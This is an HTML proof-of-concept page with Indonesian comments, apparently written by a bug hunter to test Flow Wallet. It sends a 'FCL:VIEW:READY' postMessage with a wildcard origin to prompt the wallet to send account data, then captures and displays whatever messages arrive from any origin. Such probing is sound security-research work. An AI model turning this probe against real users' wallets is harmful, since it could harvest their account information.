<!DOCTYPE html>
<html>
<head>
    <title>Bug Hunter Test</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px; }
        #status { color: red; font-weight: bold; }
    </style>
</head>
<body>
    <h2>DApp Security Test</h2>
    <p>Status: <span id="status">Menunggu respon dari Wallet...</span></p>

    <script>
        // 1. Mendengarkan kiriman data dari Flow Wallet
        window.addEventListener("message", (event) => {
            // Jika Anda menerima data di sini, periksa event.origin
            console.log("Data Tertangkap:", event.data);
            document.getElementById("status").innerText = "Data Diterima: " + JSON.stringify(event.data);
            
            // Jika alert muncul dengan domain 'flow.com', ini adalah UXSS/Origin Bypass
            alert("Origin Pengirim: " + event.origin + "\nData: " + JSON.stringify(event.data));
        });

        // 2. Mencoba memicu wallet untuk mengirimkan info akun
        // Kita menggunakan '*' agar pesan dikirim ke mana saja (uji celah keamanan)
        setTimeout(() => {
            if (window.parent !== window) {
                window.parent.postMessage({ type: 'FCL:VIEW:READY' }, '*'); 
                // FCL adalah standar Flow Client Library
            }
        }, 2000);
    </script>
</body>
</html>
